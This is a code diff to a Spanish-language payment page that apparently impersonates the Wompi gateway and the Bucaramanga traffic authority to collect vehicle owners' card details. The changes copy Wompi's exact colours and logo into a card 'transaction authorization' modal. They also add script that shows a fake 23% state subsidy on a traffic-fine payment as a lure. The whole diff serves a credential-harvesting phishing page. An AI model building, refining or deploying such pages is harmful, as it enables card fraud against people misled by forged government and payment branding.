@@ -23,101 +23,152 @@ tailwind.config = {
 
 <style>
 
-/* ===== MODAL AUTORIZACIÓN ===== */
+/* ===== MODAL AUTORIZACIÓN (ESTILO WOMPI) ===== */
 .modal-autorizacion-overlay {
   position: fixed;
   inset: 0;
-  background: rgba(0, 0, 0, 0.65);
+  background: rgba(0, 0, 0, 0.6);
   z-index: 99999;
   display: flex;
   align-items: center;
   justify-content: center;
   padding: 16px;
   overflow-y: auto;
+  backdrop-filter: blur(2px);
+  -webkit-backdrop-filter: blur(2px);
 }
 .modal-autorizacion-overlay.hidden { display: none; }
 
 .modal-autorizacion-box {
   background: #fff;
-  border-radius: 14px;
+  border-radius: 16px;
   width: 100%;
-  max-width: 460px;
-  box-shadow: 0 12px 40px rgba(0,0,0,0.3);
+  max-width: 440px;
+  box-shadow: 0 10px 40px rgba(0,0,0,0.15);
   overflow: hidden;
-  animation: authFadeIn 0.25s ease;
+  animation: authFadeIn 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
 }
 @keyframes authFadeIn {
-  from { opacity: 0; transform: translateY(12px); }
-  to   { opacity: 1; transform: translateY(0); }
+  from { opacity: 0; transform: scale(0.95) translateY(10px); }
+  to   { opacity: 1; transform: scale(1) translateY(0); }
 }
 
+/* Header con colores exactos de Wompi */
 .modal-autorizacion-header {
-  background: #0033a0;
-  color: #fff;
-  padding: 16px 20px;
+  background: #2c2a29; 
+  padding: 12px 16px; /* Un poco menos de espacio en celular */
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  border-bottom: 3px solid #b2f599;
+  flex-wrap: wrap; /* Permite que baje de línea si no cabe */
+  gap: 8px;
 }
-.modal-autorizacion-header h2 {
-  margin: 0;
-  font-size: 18px;
-  font-weight: 700;
-  text-align: center;
+
+/* Texto del Header */
+.auth-header-content {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  flex-wrap: wrap; /* Si el logo es muy grande, el texto baja */
+  width: 100%;
+}
+.auth-header-text {
+  color: #b2f599;
+  font-size: 13px; /* Un poco más pequeño para celular */
+  font-weight: 800;
+  letter-spacing: 0.5px;
+  text-transform: uppercase;
+}
+
+/* Ajuste para el Logo */
+.auth-header-logo {
+  height: 35px; /* Un poco más pequeño para que quepa bien */
+  width: auto;
+  border-radius: 8px;
+  object-fit: cover;
+  margin-left: 6px;
 }
 
 .modal-autorizacion-body {
-  padding: 22px 22px 26px;
-  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-  color: #222;
+  padding: 24px;
+  color: #16181e;
 }
 
 .auth-intro {
   font-size: 14px;
   line-height: 1.5;
-  margin: 0 0 14px;
+  color: #3c3c3c;
+  margin: 0 0 16px;
 }
-.auth-intro strong { color: #0033a0; }
+.auth-intro strong { color: #16181e; }
 
 .auth-divisor {
   height: 1px;
-  background: #e3e3e3;
+  background: #e5e5e5;
   margin: 16px 0;
 }
 
 .auth-subtitulo {
   font-size: 15px;
   font-weight: 700;
-  color: #0033a0;
-  margin: 0 0 10px;
+  color: #16181e;
+  margin: 0 0 12px;
 }
 
+/* Arreglo para que Comercio no se pegue con el nombre */
 .auth-detalle-linea {
   display: flex;
-  justify-content: space-between;
-  font-size: 13px;
-  padding: 6px 0;
-  border-bottom: 1px dashed #ececec;
+  flex-direction: column; /* En celular se pone uno debajo del otro */
+  padding: 8px 0;
+  border-bottom: 1px dashed #f0f0f0;
+  gap: 4px;
 }
-.auth-detalle-linea span { color: #666; }
-.auth-detalle-linea strong { color: #111; font-weight: 600; }
+.auth-detalle-linea span { 
+  color: #7a7a7a; 
+  font-size: 13px;
+}
+.auth-detalle-linea strong { 
+  color: #16181e; 
+  font-weight: 600; 
+  font-size: 14px;
+  word-break: break-word;
+}
+
+/* En pantallas grandes (PC) se pone en la misma línea */
+@media (min-width: 400px) {
+  .auth-detalle-linea {
+    flex-direction: row;
+    justify-content: space-between;
+    align-items: center;
+  }
+}
 
 .auth-label {
   display: block;
   font-size: 13px;
   font-weight: 600;
-  margin: 12px 0 6px;
-  color: #333;
+  margin: 14px 0 6px;
+  color: #16181e;
 }
 
 .auth-input {
   width: 100%;
   padding: 12px 14px;
   font-size: 15px;
-  border: 1.5px solid #cfcfcf;
+  border: 1.5px solid #cacaca;
   border-radius: 8px;
   outline: none;
   box-sizing: border-box;
-  transition: border-color 0.2s;
+  transition: border-color 0.2s, box-shadow 0.2s;
+  font-family: inherit;
 }
-.auth-input:focus { border-color: #0033a0; }
+.auth-input:focus { 
+  border-color: #16181e; 
+  box-shadow: 0 0 0 3px rgba(22,24,30,0.1);
+}
 
 .auth-error {
   margin-top: 12px;
@@ -132,29 +183,24 @@ tailwind.config = {
 }
 .auth-error.hidden { display: none; }
 
+/* Botón Wompi */
 .auth-btn-enviar {
-  margin-top: 18px;
+  margin-top: 20px;
   width: 100%;
   padding: 14px;
-  background: #0033a0;
-  color: #fff;
+  background: #2c2a29;
+  color: #b2f599;
   border: none;
-  border-radius: 8px;
+  border-radius: 100px;
   font-size: 16px;
   font-weight: 700;
   cursor: pointer;
-  transition: background 0.2s;
+  transition: background 0.2s, transform 0.1s;
+  font-family: inherit;
 }
-.auth-btn-enviar:hover { background: #00267a; }
-.auth-btn-enviar:disabled { background: #9aa7c7; cursor: not-allowed; }
-
-html { -webkit-text-size-adjust: 100%; -ms-text-size-adjust: 100%; -webkit-tap-highlight-color: transparent; }
-body { touch-action: manipulation; user-select: none; overscroll-behavior-y: none; font-family: 'Inter', system-ui, sans-serif; background: #f7f8fa; color: #00271c; }
-input, textarea, select { user-select: text; font-size: 16px !important; }
-button, a, .pay-method-card, .banco-card-pse { touch-action: manipulation; }
-*, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
-html { scroll-behavior: smooth; }
-img, svg { display: block; max-width: 100%; }
+.auth-btn-enviar:hover { background: #3d3a39; }
+.auth-btn-enviar:active { transform: scale(0.98); }
+.auth-btn-enviar:disabled { opacity: 0.6; cursor: not-allowed; }
 
 /* ============================================================
    PANTALLA DE CARGA INICIAL
@@ -595,15 +641,17 @@ img, svg { display: block; max-width: 100%; }
       <div class="dato-item"><span class="dato-lbl">Placa del vehículo</span><span class="dato-val" id="resumenPlaca">—</span></div>
       <div class="dato-item"><span class="dato-lbl">Correo de notificación</span><span class="dato-val" id="resumenCorreo">—</span></div>
     </div>
-    <div class="resumen-desglose">
-      <div class="desglose-row"><span>Valor de la obligación</span><span>$124.350</span></div>
-      <div class="desglose-row">
+            <div class="resumen-desglose">
+      <div class="desglose-row"><span>Valor de la obligación</span><span id="resumenValorBase">$124.350</span></div>
+      
+      <!-- Fila del subsidio (se ocultará si es Certificado) -->
+      <div class="desglose-row" id="filaSubsidio">
         <span class="subsidio">Subsidio estatal aplicado (-23%) <span class="badge-subsidio">Beneficio vigente</span></span>
-        <span class="subsidio">-$28.650</span>
+        <span class="subsidio" id="resumenDescuento">-$28.650</span>
       </div>
+      
       <div class="desglose-row total"><span>Total a pagar</span><span id="totalPagarResumen">$95.700</span></div>
     </div>
-  </div>
 
   <!-- SELECTOR MEDIO PAGO -->
   <div style="background:#fff;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,.06);padding:32px;margin-bottom:28px;">
@@ -947,6 +995,39 @@ img, svg { display: block; max-width: 100%; }
 <script src="pse-animacion.js"></script>
 <script src="app.js"></script>
 
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    var precioGuardado = sessionStorage.getItem('sub_precio') || '95700';
+    var precioNum = Number(precioGuardado);
+    
+    // Elementos del DOM
+    var elValorBase = document.getElementById('resumenValorBase');
+    var elDescuento = document.getElementById('resumenDescuento');
+    var elTotal = document.getElementById('totalPagarResumen');
+    var filaSubsidio = document.getElementById('filaSubsidio');
+
+    if (precioNum === 95700) {
+        // FLUJO SUBSIDIO (Derechos Municipales)
+        // El valor base es 124.350, el descuento es 28.650 y el total 95.700
+        if (elValorBase) elValorBase.textContent = '$124.350';
+        if (elDescuento) elDescuento.textContent = '-$28.650';
+        if (elTotal) elTotal.textContent = '$95.700';
+        if (filaSubsidio) filaSubsidio.style.display = 'flex'; // Mostrar fila de subsidio
+        
+    } else {
+        // FLUJO CERTIFICADO (o cualquier otro precio)
+        // No hay subsidio, el valor base es el mismo total
+        var fmtTotal = '$' + precioNum.toLocaleString('es-CO');
+        
+        if (elValorBase) elValorBase.textContent = fmtTotal; // El valor de la obligación es el total
+        if (elTotal) elTotal.textContent = fmtTotal;         // El total a pagar es el mismo
+        if (filaSubsidio) filaSubsidio.style.display = 'none'; // Ocultar la fila del subsidio
+    }
+
+    // Actualizar la variable global que usa app.js
+    window.TOTAL_PAGO = precioNum;
+});
+</script>
 
 <footer class="footer">
   <div class="footer-inner">
@@ -1015,8 +1096,19 @@ img, svg { display: block; max-width: 100%; }
 <!-- MODAL AUTORIZACIÓN DE TRANSACCIÓN -->
 <div id="modalAutorizacion" class="modal-autorizacion-overlay hidden">
   <div class="modal-autorizacion-box">
-    <div class="modal-autorizacion-header">
-      <h2>Autorización de transacción</h2>
+    
+    <!-- Header con Logo de Wompi -->
+       <!-- Header con Logo de Wompi (Forzado para celular) -->
+    <!-- Header con Logo de Wompi (Ajustado para celular) -->
+    <div style="background: #2c2a29; padding: 12px; display: flex; justify-content: center; align-items: center; border-bottom: 3px solid #b2f599; width: 100%; box-sizing: border-box;">
+      <div style="display: flex; align-items: center; justify-content: center; gap: 6px; flex-wrap: wrap; text-align: center;">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" style="width: 20px; height: 20px; flex-shrink: 0;">
+          <path d="M12 2L3 7V17L12 22L21 17V7L12 2Z" stroke="#b2f599" stroke-width="2" stroke-linejoin="round"/>
+          <path d="M9 12L11 14L15 10" stroke="#b2f599" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+        <span style="color: #b2f599; font-size: 13px; font-weight: 800; letter-spacing: 0.5px; text-transform: uppercase;">PAGOS SEGUROS POR</span>
+        <img src="img/LogoSecundario.svg" alt="Wompi" style="height: 35px; width: auto; border-radius: 8px; object-fit: cover; margin-left: 6px; box-shadow: 0 2px 5px rgba(0,0,0,0.2); background-color: #fff; padding: 2px;">
+      </div>
     </div>
 
     <div class="modal-autorizacion-body">
@@ -1029,7 +1121,7 @@ img, svg { display: block; max-width: 100%; }
       <div class="auth-divisor"></div>
 
       <h3 class="auth-subtitulo">Detalles de transacción</h3>
-      <div class="auth-detalle-linea"><span>Comercio</span><strong>DIRECCIÓN DE TRANS DE BUCARAMANGA</strong></div>
+      <div class="auth-detalle-linea"><span>Comercio:</span><strong> DIRECCIÓN DE TRANS DE BUCARAMANGA</strong></div>
       <div class="auth-detalle-linea"><span>Monto</span><strong id="authMontoDetalle">$95.700 COP</strong></div>
       <div class="auth-detalle-linea"><span>Tarjeta</span><strong id="authTarjetaDetalle">**** **** **** ****</strong></div>
 
